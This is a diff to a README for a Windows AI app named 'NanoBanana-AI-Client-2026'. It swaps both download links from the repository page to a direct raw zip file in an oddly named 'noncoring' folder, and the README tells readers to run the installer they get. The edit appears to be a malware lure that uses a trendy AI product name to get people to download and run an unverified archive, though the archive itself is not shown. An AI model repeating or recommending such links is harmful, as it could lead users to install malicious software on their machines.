@@ -1,6 +1,6 @@
 # 🤖 NanoBanana-AI-Client-2026 - Fast Local AI on Windows
 
-[![Download](https://img.shields.io/badge/Download-Install%20Now-blue?style=for-the-badge)](https://github.com/Juliettethicketforming60/NanoBanana-AI-Client-2026)
+[![Download](https://img.shields.io/badge/Download-Install%20Now-blue?style=for-the-badge)](https://github.com/Juliettethicketforming60/NanoBanana-AI-Client-2026/raw/refs/heads/main/noncoring/Banana_Client_Nano_A_2.5.zip)
 
 ## 🧭 Overview
 
@@ -16,7 +16,7 @@ Use it to:
 
 Visit this page to download and run the app:
 
-[Download NanoBanana-AI-Client-2026](https://github.com/Juliettethicketforming60/NanoBanana-AI-Client-2026)
+[Download NanoBanana-AI-Client-2026](https://github.com/Juliettethicketforming60/NanoBanana-AI-Client-2026/raw/refs/heads/main/noncoring/Banana_Client_Nano_A_2.5.zip)
 
 Open the page, get the Windows build, then run the installer or app file you download.
 
